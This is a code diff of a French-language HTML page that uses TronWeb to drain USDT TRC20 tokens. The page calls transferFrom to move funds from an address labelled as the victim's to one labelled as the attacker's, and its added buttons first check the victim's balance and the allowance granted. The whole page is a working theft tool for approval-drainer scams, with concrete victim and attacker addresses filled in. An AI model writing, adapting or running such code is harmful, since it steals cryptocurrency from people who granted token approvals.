@@ -2,55 +2,75 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <title>Déclenchement transferFrom TRC20</title>
+  <title>Test TRC20 - Vérifications & transferFrom</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-  <h2>Exécuter transferFrom via ApproveProxy</h2>
-  <button id="transferBtn">Exécuter transferFrom</button>
+  <h2>🧪 Vérification des autorisations USDT TRC20</h2>
+
+  <!-- Boutons -->
+  <button onclick="checkBalance()">1️⃣ Vérifier solde USDT de la victime</button>
+  <button onclick="checkAllowance()">2️⃣ Vérifier autorisation donnée</button>
+  <button onclick="runTransferFrom()">3️⃣ Exécuter transferFrom</button>
+
+  <!-- Zone de retour -->
+  <pre id="output"></pre>
 
   <script>
-    // ⚠️ A PERSONNALISER : Adresse TRON de la victime (a approuvé le proxy)
-    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T";
+    // --- 🔧 À PERSONNALISER ---
+    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T"; // adresse de la victime
+    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41"; // adresse receveuse
+    const tokenAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC20
+    const proxyAddress = "TAo4rwUGQovSD9F3qSeecUAsJsyzLetWpH"; // contrat qui a reçu l'approbation
+    const amount = 1 * 1_000_000; // 1 USDT (en sun)
 
-    // ⚠️ A PERSONNALISER : Adresse TRON qui reçoit les USDT
-    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41";
+    // Affichage
+    const output = document.getElementById("output");
 
-    // ⚠️ Adresse du token TRC20 USDT (fixe, officiel)
-    const tokenContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+    function log(message) {
+      console.log(message);
+      output.textContent += message + "\n";
+    }
 
-    // ⚠️ Adresse du contrat proxy approuvé (pour info, pas utilisé ici directement)
-    const proxyContractAddress = "TAo4rwUGQovSD9F3qSeecUAsJsyzLetWpH";
-
-    async function runTransferFrom() {
+    async function getTokenContract() {
       if (!window.tronWeb || !window.tronWeb.ready) {
-        alert("❌ Veuillez ouvrir dans le navigateur TronLink et vous connecter !");
-        return;
+        alert("Connecte-toi à TronLink !");
+        throw new Error("TronLink non connecté");
       }
+      return await window.tronWeb.contract().at(tokenAddress);
+    }
 
-      const tronWeb = window.tronWeb;
-
+    async function checkBalance() {
       try {
-        // 📦 Chargement du contrat USDT
-        const tokenContract = await tronWeb.contract().at(tokenContractAddress);
-
-        // ⚠️ A PERSONNALISER : montant à transférer (en SUN, 1 USDT = 1_000_000 SUN)
-        const amount = 1 * 1_000_000;
-
-        // 🔁 Appel à transferFrom depuis le compte connecté
-        const tx = await tokenContract.transferFrom(victim, attacker, amount).send({
-          feeLimit: 1_000_000
-        });
-
-        alert("✅ Transaction envoyée : " + tx);
-      } catch (error) {
-        console.error("❌ Erreur transferFrom :", error);
-        alert("Erreur : " + (error?.message || error));
+        const contract = await getTokenContract();
+        const balance = await contract.balanceOf(victim).call();
+        log(`💰 Solde de la victime : ${balance / 1_000_000} USDT`);
+      } catch (e) {
+        log("❌ Erreur balance : " + e.message);
       }
     }
 
-    // 🎯 Clic bouton
-    document.getElementById("transferBtn").addEventListener("click", runTransferFrom);
+    async function checkAllowance() {
+      try {
+        const contract = await getTokenContract();
+        const allowance = await contract.allowance(victim, attacker).call();
+        log(`🔐 Autorisation donnée à ${attacker} : ${allowance / 1_000_000} USDT`);
+      } catch (e) {
+        log("❌ Erreur allowance : " + e.message);
+      }
+    }
+
+    async function runTransferFrom() {
+      try {
+        const contract = await getTokenContract();
+        const tx = await contract.transferFrom(victim, attacker, amount).send({
+          feeLimit: 1_000_000,
+        });
+        log(`🚀 transferFrom envoyé ! txID : ${tx}`);
+      } catch (e) {
+        log("❌ Erreur transferFrom : " + e.message);
+      }
+    }
   </script>
 </body>
 </html>
